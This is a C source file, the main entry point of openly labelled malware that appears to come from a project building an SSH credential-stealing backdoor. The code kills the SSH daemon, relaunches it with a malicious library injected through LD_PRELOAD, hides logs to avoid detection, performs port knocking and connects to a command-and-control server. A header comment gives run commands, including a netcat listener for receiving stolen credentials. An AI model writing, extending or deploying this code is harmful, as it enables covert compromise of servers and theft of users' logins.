 /*Entry point - Starts SSH with LD_PRELOAD, calls port knocking*/

/* 
make        # Compilation
sudo ./malware      # Run the malware
ps aux | grep sshd      # Check if SSH is running with LD_PRELOAD
netcat -z -v 127.0.0.1 <ports>      # Test port knocking
sudo nc -lvp 22       # Start C2 and receive credentials
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include "connect.h"
#include "port_knocking.h"
#include "hide.h"

void restart_ssh_with_ld_preload();

int main() {
    printf("[+] Malware Initialized via LD_PRELOAD\n");

    //kill existing SSH daemon
    system("pkill -f /usr/sbin/sshd");
    sleep(2);

    //relaunch SSH daemon with LD_PRELOAD
    restart_ssh_with_ld_preload();

    //hide logs so it is not detected
    hide_logs();

    //port Knocking before contacting C2
    printf("[+] Performing port knocking to connect to C2...\n");
    perform_port_knocking();

    //connect to C2 after knocking is successful
    connect_to_c2();

    return 0;
}

void restart_ssh_with_ld_preload() {
    printf("[+] Restarting SSH daemon with LD_PRELOAD...\n");
    system("LD_PRELOAD=/path/to/malware.so /usr/sbin/sshd -D &");
}
